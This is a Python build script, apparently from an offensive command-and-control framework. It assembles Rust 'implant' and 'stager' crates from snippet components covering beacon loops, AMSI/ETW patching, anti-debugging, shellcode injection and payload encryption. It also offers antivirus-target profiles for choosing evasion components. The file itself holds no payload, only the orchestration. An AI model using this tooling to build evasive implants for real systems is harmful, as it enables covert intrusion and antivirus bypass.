# bab/assemble.py — Rust crate assembler
#
# Discovers component snippets from code_snippets/, copies .rs files into a
# temp build directory, generates Cargo.toml from merged component deps, and
# invokes cargo. Replaces the static builder/src/ crates.

import copy
import json
import re
import shutil
from pathlib import Path

from .config import HERE, BUILD_DIR
from .ui import section, ok, err, info, bold, cyan, grey, BuildAborted

SNIPPETS_ROOT    = HERE.parent / "code_snippets"
IMPLANTS_SNIPPETS = SNIPPETS_ROOT / "implants_and_stations" / "Rust"
STAGERS_SNIPPETS  = SNIPPETS_ROOT / "stagers" / "Rust"

# Shared (cross-variant) component pools for stagers. Each entry is a
# directory containing sub-directories, one per variant, each with a
# manifest.js and implementation file(s). Stager variants opt into a pool
# by setting e.g. "uses_crypto": true in their manifest.
STAGER_SHARED_POOLS = {
    "crypto": STAGERS_SNIPPETS / "crypto",   # cipher used for THORNPLD blob
    "inject": STAGERS_SNIPPETS / "inject",   # remote shellcode placement technique
}

# Component types assembled in this order for the implant
IMPLANT_COMPONENTS = ["config", "crypto", "channel", "sleep", "evasion", "execution", "main"]

# Release profiles
IMPLANT_PROFILE = [
    ("opt-level",     '"z"'),
    ("strip",         "true"),
    ("panic",         '"abort"'),
    ("lto",           '"fat"'),
    ("codegen-units", "1"),
]

STAGER_PROFILE = [
    ("opt-level",     "3"),
    ("strip",         "true"),
    ("panic",         '"abort"'),
    ("lto",           '"thin"'),
    ("codegen-units", "1"),
]

# ── Manifest loading ──────────────────────────────────────────────────────────

def _extract_first_object(text: str) -> str | None:
    try:
        start = text.index('{')
    except ValueError:
        return None
    depth = 0
    for i, ch in enumerate(text[start:], start):
        if ch == '{':   depth += 1
        elif ch == '}':
            depth -= 1
            if depth == 0:
                return text[start:i + 1]
    return None

def _load_manifest(d: Path) -> dict | None:
    m = d / "manifest.js"
    if not m.exists():
        return None
    try:
        raw = _extract_first_object(m.read_text())
        return json.loads(raw) if raw else None
    except Exception:
        return None

# ── Component discovery ───────────────────────────────────────────────────────

def _get_implant_components(component_type: str) -> list:
    base = IMPLANTS_SNIPPETS / component_type
    if not base.exists():
        return []
    results = []
    for d in sorted(base.iterdir()):
        if d.is_dir():
            m = _load_manifest(d)
            if m:
                results.append({"title": m.get("title", d.name), "path": d, "manifest": m})
    # Always put "None" first so it is option [0] regardless of directory sort order
    results.sort(key=lambda c: (0 if c["title"].lower() == "none" else 1, c["title"]))
    return results

def _get_stager_pool_options(pool: str) -> list:
    """Return all variants of a shared stager pool (e.g. "crypto")."""
    base = STAGER_SHARED_POOLS.get(pool)
    if not base or not base.exists():
        return []
    results = []
    for d in sorted(base.iterdir()):
        if d.is_dir():
            m = _load_manifest(d)
            if m:
                results.append({"title": m.get("title", d.name), "path": d, "manifest": m})
    return results


def _get_stager_options() -> list:
    """Return all stager variants under stagers/Rust/<type>/<name>/."""
    results = []
    if not STAGERS_SNIPPETS.exists():
        return results
    for type_dir in sorted(STAGERS_SNIPPETS.iterdir()):
        if not type_dir.is_dir():
            continue
        for d in sorted(type_dir.iterdir()):
            if d.is_dir():
                m = _load_manifest(d)
                if m:
                    results.append({"title": m.get("title", d.name), "path": d, "manifest": m})
    return results

# ── Interactive selection ─────────────────────────────────────────────────────

def _is_interactive() -> bool:
    """Return True if stdin is a real TTY (interactive build)."""
    import sys
    return sys.stdin.isatty()


def _pick(label: str, options: list, cfg_key: str = "", cfg: dict = None) -> dict | None:
    if not options:
        return None
    # Auto-select from config (by directory name, case-insensitive)
    if cfg and cfg_key:
        preset = cfg.get(f"component_{cfg_key}", "").strip().lower()
        if preset:
            match = next((o for o in options if o["path"].name.lower() == preset), None)
            if match:
                info(f"{label:<16} {match['title']}  {bold('(config)')}")
                return match
    if len(options) == 1:
        info(f"{label:<16} {options[0]['title']}")
        return options[0]
    # Non-interactive build (server subprocess, no TTY) — auto-select first option
    if not _is_interactive():
        info(f"{label:<16} {options[0]['title']}  {bold('(auto)')}")
        return options[0]
    print(f"\n  {bold(label)}:")
    for i, o in enumerate(options):
        print(f"    [{i}]  {o['title']}")
    while True:
        try:
            raw = input("  Select [0]: ").strip() or "0"
        except (EOFError, KeyboardInterrupt):
            print()
            raise BuildAborted("Aborted.")
        if raw.isdigit() and int(raw) < len(options):
            return options[int(raw)]
        err("Invalid selection")


def _pick_multi(label: str, options: list, cfg_key: str = "", cfg: dict = None) -> list:
    """Like _pick but allows selecting multiple options (comma-separated indices).

    Config value is a comma-separated list of directory names, e.g.
    "amsi_etw_patch,anti_debug".  "none" is accepted and filtered out —
    selecting only "none" produces an empty active list (no-op evade()).
    """
    if not options:
        return []
    # Auto-select from config
    if cfg and cfg_key:
        preset = cfg.get(f"component_{cfg_key}", "").strip()
        if preset:
            names   = {n.strip().lower() for n in preset.split(",")}
            matches = [o for o in options if o["path"].name.lower() in names]
            if matches:
                titles = ", ".join(m["title"] for m in matches)
                info(f"{label:<16} {titles}  {bold('(config)')}")
                return matches
    if len(options) == 1:
        info(f"{label:<16} {options[0]['title']}")
        return [options[0]]
    # Non-interactive build — auto-select first option
    if not _is_interactive():
        info(f"{label:<16} {options[0]['title']}  {bold('(auto)')}")
        return [options[0]]
    print(f"\n  {bold(label)} (comma-separated, e.g. 0,2):")
    for i, o in enumerate(options):
        print(f"    [{i}]  {o['title']}")
    while True:
        try:
            raw = input("  Select [0]: ").strip() or "0"
        except (EOFError, KeyboardInterrupt):
            print()
            raise BuildAborted("Aborted.")
        parts   = [p.strip() for p in raw.split(",")]
        indices = []
        valid   = True
        for p in parts:
            if p.isdigit() and int(p) < len(options):
                indices.append(int(p))
            else:
                valid = False
                break
        if valid and indices:
            return [options[i] for i in indices]
        err("Invalid selection — enter comma-separated indices, e.g. 0,2")

# ── Cargo.toml generation ─────────────────────────────────────────────────────

def _merge_deps(deps_list: list) -> dict:
    """Merge cargo_deps dicts from multiple components, combining windows features."""
    merged = {}
    for deps in deps_list:
        for name, spec in deps.items():
            if name not in merged:
                merged[name] = copy.deepcopy(spec) if isinstance(spec, dict) else spec
            elif isinstance(spec, dict) and isinstance(merged[name], dict):
                existing = set(merged[name].get("features", []))
                merged[name]["features"] = sorted(existing | set(spec.get("features", [])))
    return merged

def _emit_deps(lines: list, deps: dict) -> None:
    for dep_name, spec in deps.items():
        if isinstance(spec, str):
            lines.append(f'{dep_name} = "{spec}"')
        elif isinstance(spec, dict):
            feats = ", ".join(f'"{f}"' for f in spec.get("features", []))
            lines.append(f'{dep_name} = {{ version = "{spec["version"]}", features = [{feats}] }}')

def _gen_cargo_toml(crate_name: str, deps: dict, profile: list,
                    build_deps: dict | None = None,
                    has_build_rs: bool = False) -> str:
    lines = [
        "[package]",
        f'name = "{crate_name}"',
        'version = "0.1.0"',
        'edition = "2021"',
    ]
    if has_build_rs:
        lines.append('build = "build.rs"')
    lines += [
        "",
        "[[bin]]",
        f'name = "{crate_name}"',
        'path = "src/main.rs"',
        "",
        "[dependencies]",
    ]
    _emit_deps(lines, deps)
    if build_deps:
        lines += ["", "[build-dependencies]"]
        _emit_deps(lines, build_deps)
    lines += ["", "[profile.release]"]
    for key, val in profile:
        lines.append(f"{key} = {val}")
    return "\n".join(lines) + "\n"

# ── Evasion combiner ─────────────────────────────────────────────────────────

def _generate_combined_evasion(selected: list) -> str:
    """Generate a single evasion.rs that calls evade() from each selected component.

    Each component's evasion.rs is wrapped in its own inner module to avoid
    name collisions (constants, helper functions, etc.).  The outer evade()
    calls each inner evade() in selection order.

    Selecting only "none" produces an empty evade() body.
    """
    active = [c for c in selected if c["path"].name != "none"]
    if not active:
        return "pub fn evade() {}\n"

    parts     = []
    mod_names = []
    for c in active:
        rs = next((f for f in c["path"].iterdir() if f.suffix == ".rs"), None)
        if rs is None:
            continue
        mod_name = "ev_" + c["path"].name.replace("-", "_")
        content  = rs.read_text()
        parts.append(f"mod {mod_name} {{\n{content}}}")
        mod_names.append(mod_name)

    if not mod_names:
        return "pub fn evade() {}\n"

    calls = "\n    ".join(f"{m}::evade();" for m in mod_names)
    parts.append(f"\npub fn evade() {{\n    {calls}\n}}")
    return "\n\n".join(parts) + "\n"


# ── Assembly ──────────────────────────────────────────────────────────────────

def _write_crate(label: str, rs_files: dict, cargo_toml: str,
                 root_files: dict | None = None,
                 extra_files: dict | None = None) -> Path:
    """Write assembled source files into BUILD_DIR/<label>/ and return the dir.

    rs_files values may be either a Path (file is copied) or a str (content is
    written directly — used for generated files such as combined evasion.rs).

    root_files are placed at the crate root rather than in src/ (used for
    build.rs and similar crate-level files).

    extra_files maps crate-relative paths (e.g. ".cargo/config.toml") to a
    source Path or str content — used for nested config files that neither
    fit under src/ nor sit at the crate root.
    """
    crate_dir = BUILD_DIR / label
    # Wipe any prior assembled sources so stale .rs files from a previous
    # stager/implant variant don't leak into the new crate. `target/` is
    # preserved — compile_cargo handles invalidation of that.
    src_dir = crate_dir / "src"
    if src_dir.exists():
        shutil.rmtree(src_dir, ignore_errors=True)
    for stale in ("link.x", "build.rs", ".cargo"):
        p = crate_dir / stale
        if p.is_file():
            p.unlink()
        elif p.is_dir():
            shutil.rmtree(p, ignore_errors=True)
    src_dir.mkdir(parents=True, exist_ok=True)

    for filename, src in rs_files.items():
        if isinstance(src, Path):
            shutil.copy2(src, src_dir / filename)
        else:
            (src_dir / filename).write_text(src)

    if root_files:
        for filename, src in root_files.items():
            if isinstance(src, Path):
                shutil.copy2(src, crate_dir / filename)
            else:
                (crate_dir / filename).write_text(src)

    if extra_files:
        for rel, src in extra_files.items():
            dest = crate_dir / rel
            dest.parent.mkdir(parents=True, exist_ok=True)
            if isinstance(src, Path):
                shutil.copy2(src, dest)
            else:
                dest.write_text(src)

    (crate_dir / "Cargo.toml").write_text(cargo_toml)
    return crate_dir

# ── Profile loading ──────────────────────────────────────────────────────────

PROFILES_FILE = HERE / "profiles.json"

def _load_profiles() -> list:
    if not PROFILES_FILE.exists():
        return []
    try:
        return json.loads(PROFILES_FILE.read_text()).get("profiles", [])
    except Exception:
        return []


def select_profile() -> dict | None:
    """Show AV target profiles and an Advanced option. Returns a config dict
    with component selections pre-filled, or None if the user chose Advanced."""
    profiles = _load_profiles()
    if not profiles:
        return None

    print(f"\n  {bold('Target AV:')}")
    for i, p in enumerate(profiles):
        print(f"    [{i}]  {p['name']:<22} {grey(p.get('description', '')[:70])}")
    adv_idx = len(profiles)
    print(f"    [{adv_idx}]  {cyan('Advanced')}             {grey('Choose individual components')}")

    while True:
        try:
            raw = input(f"  Select [0]: ").strip() or "0"
        except (EOFError, KeyboardInterrupt):
            print()
            raise BuildAborted("Aborted.")
        if raw.isdigit():
            idx = int(raw)
            if idx == adv_idx:
                return None   # caller falls through to manual selection
            if idx < len(profiles):
                profile = profiles[idx]
                ok(f"Profile: {bold(profile['name'])}")
                return dict(profile.get("config", {}))
        err("Invalid selection")


def select_implant_components() -> dict:
    """Prompt the operator for component choices and return them as config keys.
    Does not write any files — used by the CLI before submitting a server build."""
    selections = {}
    for ct in IMPLANT_COMPONENTS:
        options = _get_implant_components(ct)
        if ct == "evasion":
            chosen = _pick_multi(ct.capitalize(), options)
            if chosen:
                selections[f"component_{ct}"] = ",".join(c["path"].name for c in chosen)
        else:
            c = _pick(ct.capitalize(), options)
            if c:
                selections[f"component_{ct}"] = c["path"].name
    return selections


def select_stager_component() -> dict:
    """Prompt for stager variant and return as a config key."""
    options = _get_stager_options()
    c = _pick("Stager", options)
    return {f"component_stager": c["path"].name} if c else {}


def assemble_implant(cfg: dict = None) -> bool:
    section("Assemble Implant")
    chosen       = {}   # ct -> single component dict
    chosen_multi = {}   # ct -> list of component dicts (evasion only)

    for ct in IMPLANT_COMPONENTS:
        options = _get_implant_components(ct)
        if ct == "evasion":
            ev_list = _pick_multi(ct.capitalize(), options, cfg_key=ct, cfg=cfg)
            chosen_multi[ct] = ev_list if ev_list else []
        else:
            c = _pick(ct.capitalize(), options, cfg_key=ct, cfg=cfg)
            if c:
                chosen[ct] = c
            elif ct == "main":
                err("No main/beacon_loop component found")
                return False

    if not chosen:
        err("No components found in code_snippets/implants_and_stations/Rust/")
        return False

    # Collect .rs files and merged deps
    rs_files = {}
    all_deps = []

    for ct in IMPLANT_COMPONENTS:
        if ct == "evasion":
            ev_list = chosen_multi.get("evasion", [])
            # Merge deps from all selected evasion components
            for c in ev_list:
                all_deps.append(c["manifest"].get("cargo_deps", {}))
            # Generate combined evasion.rs (handles "none" / empty list gracefully)
            rs_files["evasion.rs"] = _generate_combined_evasion(ev_list)
        elif ct in chosen:
            c  = chosen[ct]
            rs_list = [f for f in c["path"].iterdir()
                       if f.suffix == ".rs" and f.name not in ("manifest.js",)]
            if not rs_list:
                err(f"No .rs file in {c['path']}")
                return False
            for rs in rs_list:
                rs_files[rs.name] = rs
            all_deps.append(c["manifest"].get("cargo_deps", {}))

    cargo_toml = _gen_cargo_toml("implant", _merge_deps(all_deps), IMPLANT_PROFILE)
    _write_crate("implant", rs_files, cargo_toml)
    ok("Implant crate assembled")
    return True

def assemble_stager(cfg: dict = None) -> bool:
    section("Assemble Stager")
    options = _get_stager_options()
    chosen  = _pick("Stager", options, cfg_key="stager", cfg=cfg)
    if not chosen:
        err("No stager components found in code_snippets/stagers/Rust/")
        return False

    # src/*.rs — everything except build.rs lives under src/
    rs_files = {f.name: f for f in chosen["path"].iterdir()
                if f.suffix == ".rs" and f.name != "build.rs"}
    if not rs_files:
        err(f"No .rs files in {chosen['path']}")
        return False

    # ── Shared pool components ────────────────────────────────────────────
    # Stager variants opt in by setting e.g. "uses_crypto": true in their
    # manifest. Each pool contributes (a) an implementation .rs file placed
    # under src/ with the canonical name (e.g. crypto.rs) and (b) its own
    # cargo_deps which are merged into the final Cargo.toml.
    pool_deps = []
    if chosen["manifest"].get("uses_crypto"):
        pool_options = _get_stager_pool_options("crypto")
        if not pool_options:
            err("Stager variant requires a crypto component but none are available "
                "in code_snippets/stagers/Rust/crypto/")
            return False
        pool_choice = _pick("Crypto", pool_options, cfg_key="stager_crypto", cfg=cfg)
        # Pool variant must contain exactly one .rs named crypto.rs
        crypto_rs = pool_choice["path"] / "crypto.rs"
        if not crypto_rs.exists():
            err(f"Crypto variant missing crypto.rs: {pool_choice['path']}")
            return False
        rs_files["crypto.rs"] = crypto_rs
        pool_deps.append(pool_choice["manifest"].get("cargo_deps", {}))

    if chosen["manifest"].get("uses_inject"):
        pool_options = _get_stager_pool_options("inject")
        if not pool_options:
            err("Stager variant requires an inject component but none are available "
                "in code_snippets/stagers/Rust/inject/")
            return False
        pool_choice = _pick("Inject", pool_options, cfg_key="stager_inject", cfg=cfg)
        inject_rs = pool_choice["path"] / "inject.rs"
        if not inject_rs.exists():
            err(f"Inject variant missing inject.rs: {pool_choice['path']}")
            return False
        rs_files["inject.rs"] = inject_rs
        pool_deps.append(pool_choice["manifest"].get("cargo_deps", {}))

    # Crate-root files (build.rs, resource files, linker scripts, etc.)
    root_files = {}
    build_rs = chosen["path"] / "build.rs"
    if build_rs.exists():
        root_files["build.rs"] = build_rs
    for extra in chosen["path"].glob("*.rc"):
        root_files[extra.name] = extra
    for extra in chosen["path"].glob("*.x"):     # linker scripts (link.x)
        root_files[extra.name] = extra

    # Nested config files (.cargo/config.toml) — copied preserving the
    # relative path under the crate root.
    extra_files = {}
    cargo_cfg = chosen["path"] / ".cargo" / "config.toml"
    if cargo_cfg.exists():
        extra_files[".cargo/config.toml"] = cargo_cfg

    deps       = _merge_deps([chosen["manifest"].get("cargo_deps", {}), *pool_deps])
    build_deps = chosen["manifest"].get("cargo_build_deps", {})
    cargo_toml = _gen_cargo_toml(
        "stager", deps, STAGER_PROFILE,
        build_deps=build_deps,
        has_build_rs=bool(root_files.get("build.rs")),
    )
    _write_crate("stager", rs_files, cargo_toml,
                 root_files=root_files, extra_files=extra_files)
    ok("Stager crate assembled")
    return True
